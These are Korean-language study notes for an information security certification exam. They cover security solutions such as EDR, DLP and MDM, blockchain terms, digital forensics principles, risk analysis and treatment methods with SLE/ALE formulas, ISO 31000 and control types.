ch3-01 Q3·Q7 · 서술 Q3

설명문을 읽고 솔루션 이름을 쓰는 문제다. 각 솔루션이 '어디서, 무엇을' 지키는지로 구분한다.

  • EDR(Endpoint Detection and Response) — 컴퓨터·모바일·서버 등 단말의 악성 행위를 실시간 탐지·분석·대응. 제로데이 공격 방어에 효과적
    • 기능: 탐지(파일 기반 외의 사고도) · 통제(사고 억제) · 분석(조사 기반 대응) · 치료(감염 전 상태로 복구)
  • DLP(Data Loss Prevention) — 내부의 민감 데이터·지적재산·고객정보가 외부로 유출되는 것을 모니터링하고 실시간 차단
    • 엔드포인트 DLP(단말에 설치) / 네트워크 DLP(패킷 필터링)
  • BYOD(개인 기기 업무 사용) 보안 기술
    • MDM(Mobile Device Management) — 스마트폰·태블릿 등 디바이스 관리. 루팅 탐지·차단, 원격 앱 관리, 설정·자산 관리
    • 컨테이너화 — 실행환경을 격리한 샌드박스 안에서만 기밀 정보 접근·업무 앱 구동
    • 모바일 가상화 — 한 기기에 같은 OS의 다중 인스턴스를 두어 업무용·개인용 모드를 동시에 사용
    • 그 밖에: VDI(서버가 가상 데스크톱 제공), 클라우드 DaaS, 앱래핑(앱에 보안 코드 삽입)

10블록체인

ch3-01 Q4

분산 장부 기술의 기본 용어를 묻는다. 비트코인·블록체인·채굴의 관계를 한 문장으로 설명할 수 있으면 된다.

  • 블록체인 — 분산 데이터베이스의 한 형태. 분산 노드 운영자가 임의로 조작할 수 없도록 설계되어 계속 성장하는 기록(블록)을 연결한 모음
  • 주요 기술
    • 분산 원장 — 참여자 합의로 복제·공유되는 저장소. 탈중앙화의 기반
    • 채굴(마이닝) — 거래를 검증하고 새 블록을 만들어 체인에 추가하는 과정. 해시 연산으로 작업을 증명한 대가로 코인을 받음
    • 스마트 계약 — 조건이 충족되면 제3자 개입 없이 자동 실행되는 계약
    • 합의 알고리즘 — 참여자들이 데이터 적합성에 동의하는 과정. PoW, PoS
  • 비트코인 — 사토시 나카모토가 개발한 온라인 암호화폐. 중앙은행 없이 P2P로 송금 / 이더리움 — 스마트 계약을 구현하는 분산 컴퓨팅 플랫폼이자 통화

11디지털 포렌식

ch3-01 Q8 · 서술 Q1·Q2

사고 증거를 법정에서 쓰려면 수집·보관 과정이 엄격해야 한다. 5원칙의 이름과 내용, 절차 순서가 거의 매번 나온다.

  • 디지털 포렌식 — 디지털 매체를 매개로 한 범죄의 법적 증거 확보를 위해 자료를 수집·분석·보존해 법적 증거물로 제출할 수 있게 하는 절차와 방법
  • 5원칙
    • 정당성 — 적법한 절차로 수집. 불법 수집은 증거 능력 상실
    • 재현 — 같은 조건에서 항상 같은 결과가 나와야 함
    • 신속성 — 빨리 수집. 메모리의 휘발성 정보(실행 중 프로세스 등)는 늦으면 사라짐
    • 연계 보관성(Chain of Custody) — 수집→이송→분석→보관→법정 제출 전 과정이 명확하고 추적 가능. 인수인계 기록과 검증 필요
    • 무결성 — 각 단계에서 위·변조되지 않았음을 입증. 해시값으로 검증
  • 절차: 준비 → 증거획득 → 보관/이송 → 검증/분석 → 보고서 제출 (암기: 준획이분보)

01정보보호 정책 체계

01 Q1·Q2·Q6

조직이 '무엇을, 어떻게 지킬지'를 글로 정해 두는 출발점이다. 시험은 정책 아래 문서들의 역할 차이와 정책의 구성 요건을 묻는다.

  • 정보보호 정책 — 정보보호의 목적과 기본 방향을 정한 최상위 문서. 최고경영자가 승인
    • 구성 요건 5가지: 목적(무엇을 지킬지) · 적용 범위(업무·서비스·조직·사람·자산) · 내용(간단·명료) · 책임(경영진·보안조직·직원) · 문서화(공식 승인)
  • 정책을 구체화하는 세 문서
    • 표준(Standards) — 기술적 세부 기준. 모든 사용자가 지켜야 하는 의무·강제
    • 지침(Guideline) — 도움이 되는 권고 사항. 선택적
    • 절차(Procedure) — 실제로 어떻게 하는지 단계별로 쓴 문서. 실무자용
  • 정보보호 거버넌스 — 기업 거버넌스의 부분집합. 정보 무결성·서비스 연속성을 보장하고 전략적 방향을 제시하며, 경영 목표와 정보보호 목표를 일치시키는 체계

02정보보호의 목표

01 Q3·Q4·Q5

모든 보안 기술은 결국 기밀성·무결성·가용성(CIA) 중 하나를 지키기 위한 것이다. 각 목표의 정의 문장과 대표 기술을 연결해 외운다.

  • 기밀성(Confidentiality) — 인가된 사람·시스템만 정보에 접근. 비인가자에게 노출되지 않음 → 암호화, 접근 제어, 비밀번호
  • 무결성(Integrity) — 비인가자가 변경·삭제·생성하지 못함. 정확성과 완전성 보장 → 체크섬, 해시 함수, 디지털 서명
  • 가용성(Availability) — 정당한 사용자가 필요할 때 서비스를 계속 쓸 수 있음 → 백업, RAID, DRS
  • 그 밖의 목표
    • 책임 추적성 — 누가 무엇을 했는지 추적하고 책임지게 함
    • 부인방지 — 송신자·수신자가 자신의 행위를 부인하지 못하게 함
    • 인증 — 사용자·시스템의 신원을 확인해 실제 권한자인지 검증
  • 위험 관리 계획을 세울 때는 위험평가로 업무 우선순위와 보호 대책 수준을 정한다

03위험의 구성요소

02 Q4·Q13·Q15·Q17·Q22·Q28·Q35 · 서술 Q12

위험은 네 요소가 얽혀 만들어진다. 관계를 이해하면 공식·관계도·용어 문제를 한 번에 푼다. (집에 비유: 자산=귀중품, 위협=도둑, 취약성=안 잠긴 창문, 대책=자물쇠)

  • 자산(Asset) — 지켜야 할 대상. 정보·하드웨어·소프트웨어·시설 + 인력·기업 이미지 같은 무형 자산. 위험 분석에서 파악할 것은 사고 시 손실
  • 위협(Threat) — 자산에 손실을 일으킬 수 있는 원치 않는 사건의 원인·행위자. 환경적(자연재해·장비 고장) / 인간적(해킹·내부자 유출)
  • 취약성(Vulnerability) — 자산에 내재된 약점. 위협이 이용하는 대상. 정보보호 대책의 미비로 생기며, 대책을 적용하면 줄어듦
  • 정보보호 대책(Safeguard) — 위험을 억제하거나 허용 수준으로 낮추는 관리적·물리적·기술적 장치. 제품(방화벽·IDS)뿐 아니라 절차·정책·교육도 포함. 구축 비용 + 운영 비용을 함께 고려
  • 관계: 위협은 취약성을 공격하고, 취약성은 자산을 노출하며, 자산은 가치를 보유한다. 이들은 모두 위험을 증가시키고, 대책은 위협을 방어해 위험을 감소시킨다
  • 잔여 위험 = (자산) × (취약점) × (위협) − (정보보호 대책). 대책을 적용한 뒤에도 남는 위험 (암기: 자취위대)

04위험 관리 과정과 용어

02 Q1·Q7·Q21·Q26·Q29·Q31·Q33

위험 '분석·평가·관리'는 비슷해 보여도 시험에서는 엄격히 구분한다. 전체 흐름 안에서 각 단계가 하는 일을 기억한다. (건강검진 비유: 분석=검사로 수치 뽑기, 평가=기준과 비교해 위험한지 판단, 관리=전체 과정)

  • 위험 관리 과정 5단계
    • ① 위험 관리 전략·계획 수립 — 조직 목표와 연계, 방법·비용·시간·인력 결정
    • ② 위험 분석(Risk Analysis) — 자산·위협·취약점·기존 대책을 분석해 위험의 종류와 규모 결정
    • ③ 위험평가(Risk Assessment) — 분석 결과로 위험도를 매기고, DoA를 정해 우선순위와 대응 여부 결정. DoA를 넘는 위험에만 대책 수립
    • ④ 정보보호 대책 선정 — 위험처리 전략과 통제 사항 선택, 대책 명세서 작성
    • ⑤ 정보보호 계획 수립 — 우선순위·일정·예산·책임자가 든 이행 계획
  • 위험 관리(Risk Management) — 위험을 감수할 수 있는 수준으로 유지하기 위해 분석하고 비용 대비 효과적인 대책을 마련하는 전체 과정
  • 위험 관리 계획(Risk Management Plan) — 선택된 통제를 누가·언제·어디서·어떻게 적용할지 명시한 종합 전략 문서
  • 수용 가능한 목표 위험 수준(DoA) — 경영진이 의사결정으로 정한 '여기까지는 감수한다'는 한계선. 위험이 낮아도 대책 효과성 평가와 모니터링은 계속해야 함

05위험 분석 절차와 자산 분석

02 Q2·Q24·Q25·Q34 · 서술 Q2·Q7·Q10·Q11

위험 분석은 '무엇을 가지고 있는지' 아는 것에서 시작한다. 절차의 순서와 자산 분석 3단계를 묻는다.

  • 위험 분석 절차 7단계: 범위 결정 → 자산 식별 → 자산 가치 평가 → 위협 및 발생 가능성 평가 → 취약성 평가 → 기설치 보안대책 평가 → 위험 정도 평가
    • 위험 정도 평가 — 자산 가치·위협 가능성·취약성·대책 효과를 종합해 상·중·하로 분류, 개선 우선순위 도출
  • 자산 분석 3단계
    • 자산 식별 — 보호 대상 자산을 빠짐없이 찾아 자산목록 작성. 가장 기초이자 필수
    • 자산 가치 평가 — C·I·A 관점에서 중요도 분석. 정량(영향도·점수) / 정성(낮음·보통·높음 등급)
    • 자산 그룹핑 — 유형·중요도가 비슷한 자산을 한 그룹으로 묶음 → 중복 분석이 없어져 시간·비용 절감, 일관성 확보
  • 기밀성 등급: 높음=허가자만 열람, 외부 유출 시 치명적 / 중간=조직 내 공개 가능, 외부 유출 시 상당한 문제 / 낮음=외부 유출돼도 영향 미미
  • 위험 평가서 항목: 자산 중요도(C,I,A) · 우려사항(자산이 직면한 위협 시나리오) · 가능성(위협이 실제 발생할 빈도·확률) → 위험도

06위험 분석 접근법 4가지

02 Q6·Q20 · 서술 Q4·Q9

모든 자산을 같은 깊이로 분석하면 비용이 너무 든다. 상황에 맞는 접근법을 고르는 것이 핵심이며 장단점 서술이 자주 나온다. (건강검진 비유: 기본 검진 / 의사 감 / 정밀 검사 전부 / 이상 부위만 정밀 검사)

  • 기준선 접근법(Baseline) — 체크리스트의 보안대책이 구현돼 있는지 판단해 없는 것을 구현. 모든 시스템에 기본 보호 수준 적용
    • 장점: 시간·비용 적게 들고 특별한 자원 불필요 / 단점: 조직 특성을 반영 못 해 과보호·부족 보호 가능
  • 비정형 접근법(Informal) — 구조적 방법론 없이 경험자의 지식으로 중요 위험 중심 분석
  • 상세 위험 분석(Detailed) — 모든 IT 자산을 정립된 모델로 자산·위협·취약성 분석. 업무 중요도나 자산 가치가 큰 경우 적용
    • 장점: 시스템별 적절한 보안 수준 확인, 가장 상세 / 단점: 시간·비용·전문성 많이 들고 중요 시스템이 늦게 다뤄질 수 있음
  • 통합(복합·혼합) 접근법(Combined) — 고위험 영역만 상세 분석, 나머지는 기준선. 가장 비용 효율적, 가장 권장
    • 장점: 유연한 적용, 자원 효율, 고위험 영역 빠른 처리, 부분 계량화 / 단점: 고위험 영역을 잘못 식별하면 비용 낭비·부적절 대응, 상세 분석이 필요한 시스템이 빠질 수 있음

07정성적 분석과 정량적 분석

02 Q3·Q12·Q16·Q18·Q27 · 서술 Q3·Q5·Q6

위험을 '말'로 매기는가 '숫자'로 매기는가의 차이다. 정량 공식은 계산 문제로 바로 나오므로 예제까지 손에 익힌다.

  • 정성적 위험 분석
    • 델파이법 — 전문가 집단의 토론으로 분석. 빠르고 비용 적지만 추정 정확도 낮음
    • 시나리오법 — '어떤 사건도 기대대로 일어나지 않는다'는 전제로 조건별 결과를 추정. 적은 정보로 가능하고 의사소통에 좋지만 이론적 추측에 그침
    • 순위 결정법 — 중요도·가능성·영향력 기준으로 순위를 매겨 상대 평가
    • 퍼지 행렬법 — 자산·위협·보안 체계를 정성 언어값으로 표현해 기대손실 평가
  • 정량적 위험 분석 공식
    • SLE(단일 예상 손실액) = AV(자산 가치) × EF(노출계수, 손실 비율)
    • ALE(연간 예상 손실액) = SLE × ARO(연간 발생률 = 발생 횟수 / 기간)
    • ROI = (ALE − X) / X × 100% (X = 투입 비용)
    • 대책 적용 시 순이익 = (적용 전 ALE − 적용 후 ALE) − 대책 비용. 두 대책을 비교할 때는 순이익이 큰 쪽 선택
  • 예제: 자산 40억, 화재 시 30% 손실, 5년에 1번 → SLE = 40억 × 0.3 = 12억, ARO = 1/5 = 0.2, ALE = 12억 × 0.2 = 2.4억

08위험 처리(대응) 방식 4가지

02 Q5·Q8·Q11·Q14·Q19·Q32 · 서술 Q1·Q8

위험을 찾았으면 어떻게 할지 정해야 한다. 거의 매회 나오므로 정의 문장을 정확히 외운다. (오토바이 배달 비유: 그냥 탄다=수용, 헬멧=완화, 보험=전가, 배달 안 함=회피)

  • 위험 수용(Acceptance) — 현재 위험을 받아들이고 손실을 감수. 완전 제거는 불가능하므로 일정 수준 이하는 인정하고 사업 진행
  • 위험 완화(Reduction·Mitigation, 감소·축소) — 대책을 채택·구현해 위험을 허용 범위로 낮춤. 대책 선택 시 소요 비용과 위험 감소 크기를 비교(비용효과 분석)
  • 위험 전가(Transition·Transfer, 전이) — 위험은 그대로 두고 손실·책임을 제3자에게 이전. 방법은 보험 가입, 외주 위탁. 비용 수반
  • 위험 회피(Avoidance) — 위험이 있는 프로세스·사업을 수행하지 않거나 중단해 위험 자체를 없앰

09통제의 종류

02 Q9·Q10

대책(통제)은 '언제 작동하는가'로 나눈다. 시점별 3가지와 예방 통제의 하위 2가지를 묻는다. (학교 비유: 교문 경비=예방, CCTV=탐지, 사고 후 조치=교정)

  • 시점별 통제
    • 예방 통제 — 잠재 위험 요소를 사전에 제거. 선제적·능동적
    • 탐지 통제 — 예방 통제를 우회해 발생한 문제를 찾아냄
    • 교정 통제 — 탐지된 사고에 대처하고 위험을 최소화
  • 예방 통제의 유형
    • 물리적 접근 통제 — 관계자 외 시설·설비 접근 제한
    • 논리적 접근 통제 — 승인되지 않은 사람이 네트워크로 자산에 접근하지 못하게 함

10ISO 31000 위험 관리 프레임워크

02 Q23·Q30

국제 표준이 정한 위험 관리의 큰 틀이다. 그림 문제로 나오며 '위험 평가' 안의 세 단계 순서를 묻는다. (찾기 → 재기 → 판단하기)

  • 흐름: 환경 설정 → 위험 평가 → 위험 처리 → 위험 수용, 전 과정에 걸쳐 의사소통 및 협의, 위험 모니터링 및 검토
  • 환경 설정 — 조직의 환경·이해관계자·범위·기준을 정의. 어떤 관점에서 위험을 다룰지 기준 설정
  • 위험 평가 3단계
    • 위험 식별(Risk Identification) — 자산·위협·취약점과 법규·이해관계자 기대·내외부 환경을 검토해 잠재 위험을 찾음
    • 위험 분석(Risk Analysis) — 식별된 위험의 성격·영향을 분석해 심각도 평가
    • 위험 수준 평가(Risk Evaluation) — 조직의 위험 기준과 비교해 수용 여부·우선순위 결정. 위험 감수성(Risk Appetite)을 고려해 DoA 결정
  • 위험 처리 — 회피·전가·완화·수용 적용. 결과가 만족스럽지 않으면 재검토 후 다시 위험평가로
  • 위험 수용 — 허용 가능한 수준으로 관리되면 최종 수용
